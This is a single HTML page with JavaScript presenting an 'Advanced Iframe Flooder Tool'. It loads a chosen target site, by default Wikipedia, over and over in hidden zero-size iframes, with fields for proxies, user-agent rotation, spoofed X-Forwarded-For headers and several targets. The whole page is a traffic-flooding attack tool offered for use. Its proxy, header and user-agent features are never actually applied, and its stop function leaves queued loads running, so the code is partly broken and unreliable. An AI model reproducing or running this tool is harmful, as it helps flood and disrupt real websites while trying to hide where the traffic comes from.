<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Advanced Iframe Flooder Tool</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      background: #f4f7fc;
      color: #333;
      overflow-x: hidden;
    }

    h1 {
      text-align: center;
      color: #4CAF50;
      margin-top: 20px;
    }

    .container {
      width: 90%;
      max-width: 900px;
      margin: 0 auto;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      box-sizing: border-box;
    }

    .container label {
      font-weight: bold;
      margin-top: 10px;
      display: block;
    }

    input, button, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 15px;
    }

    button.stop {
      background-color: #f44336;
    }

    button:hover {
      opacity: 0.9;
    }

    .status {
      text-align: center;
      font-weight: bold;
      color: #4CAF50;
      margin-top: 20px;
    }

    .error {
      color: #f44336;
      font-weight: bold;
    }

    #iframeContainer {
      display: none;
    }

    #dashboard {
      background-color: #f1f1f1;
      padding: 15px;
      border-radius: 5px;
      margin-top: 20px;
    }

    .stats {
      margin: 5px 0;
    }

    .stats span {
      font-weight: bold;
    }

    /* Responsive Design */
    @media (max-width: 768px) {
      .container {
        width: 100%;
        padding: 15px;
      }
    }
  </style>
</head>
<body>

  <h1>Advanced Iframe Flooder Tool</h1>

  <div class="container">
    <label for="targetUrl">Target URL:</label>
    <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">

    <label for="iframeCount">Number of Iframes:</label>
    <input type="number" id="iframeCount" value="50" min="1">

    <label for="delay">Delay Between Iframes (seconds):</label>
    <input type="number" id="delay" value="1" min="0">

    <label for="proxyList">Proxy List (comma separated):</label>
    <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">

    <label for="userAgentRotation">Enable User-Agent Rotation:</label>
    <input type="checkbox" id="userAgentRotation">

    <label for="headers">Custom Headers (Optional):</label>
    <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>

    <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
    <input type="number" id="autoStopTimer" value="60" min="0">

    <label for="targetRotation">Multiple Target URLs (comma separated):</label>
    <input type="text" id="targetRotation" placeholder="https://www.example1.com, https://www.example2.com">

    <button onclick="startFlood()">Start Flooding</button>
    <button class="stop" onclick="stopFlood()">Stop Flooding</button>

    <div class="status" id="status">Ready</div>

    <div id="dashboard">
      <h3>Flooding Stats</h3>
      <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
      <p class="stats">Failures: <span id="failureCount">0</span></p>
      <p class="stats">Current Target: <span id="currentTarget">None</span></p>
    </div>
  </div>

  <script>
    let flooding = false;
    let frameCount = 0;
    let failureCount = 0;
    let currentTarget = '';
    let proxyList = [];
    let userAgentRotation = false;
    let targetRotation = [];
    let currentProxyIndex = 0;
    let currentTargetIndex = 0;

    function startFlood() {
      if (flooding) return;
      flooding = true;
      document.getElementById('status').innerText = "Flooding in progress...";

      // Get target URL(s) and proxy list
      currentTarget = document.getElementById('targetUrl').value;
      targetRotation = document.getElementById('targetRotation').value.split(',');
      proxyList = document.getElementById('proxyList').value.split(',');

      // Get custom headers
      const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());

      // Get delay between iframe loading
      const delay = parseInt(document.getElementById('delay').value) * 1000;

      // Start iframe flooding
      floodIframes(currentTarget, delay, customHeaders);
    }

    function floodIframes(target, delay, customHeaders) {
      if (targetRotation.length > 0) {
        currentTarget = targetRotation[currentTargetIndex % targetRotation.length];
      }

      const iframeCount = parseInt(document.getElementById('iframeCount').value);
      for (let i = 0; i < iframeCount; i++) {
        setTimeout(() => {
          loadIframe(currentTarget, customHeaders);
          frameCount++;
          document.getElementById('frameCount').innerText = frameCount;
        }, delay * i);
      }

      // Auto stop timer
      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
      if (autoStopTime > 0) {
        setTimeout(stopFlood, autoStopTime);
      }
    }

    function loadIframe(target, customHeaders) {
      const iframe = document.createElement('iframe');
      iframe.src = target;
      iframe.style.width = "0";
      iframe.style.height = "0";
      iframe.style.border = "none";

      // Apply custom headers if provided
      customHeaders.forEach(header => {
        const [key, value] = header.split(':');
        iframe.setAttribute('X-Header-' + key, value);
      });

      iframe.onload = () => {
        console.log(`Iframe loaded successfully: ${iframe.src}`);
      };

      iframe.onerror = () => {
        console.error(`Error loading iframe: ${iframe.src}`);
        failureCount++;
        document.getElementById('failureCount').innerText = failureCount;
      };

      document.body.appendChild(iframe);
    }

    function stopFlood() {
      flooding = false;
      document.getElementById('status').innerText = "Flooding stopped.";
      frameCount = 0;
      failureCount = 0;
      document.getElementById('frameCount').innerText = frameCount;
      document.getElementById('failureCount').innerText = failureCount;
    }

    function getRandomUserAgent() {
      const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko'
      ];
      return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    function getNextProxy() {
      if (proxyList.length === 0) return null;
      currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
      return proxyList[currentProxyIndex];
    }

    function updateDashboard() {
      document.getElementById('frameCount').innerText = frameCount;
      document.getElementById('failureCount').innerText = failureCount;
      document.getElementById('currentTarget').innerText = currentTarget;
    }
  </script>

</body>
</html>
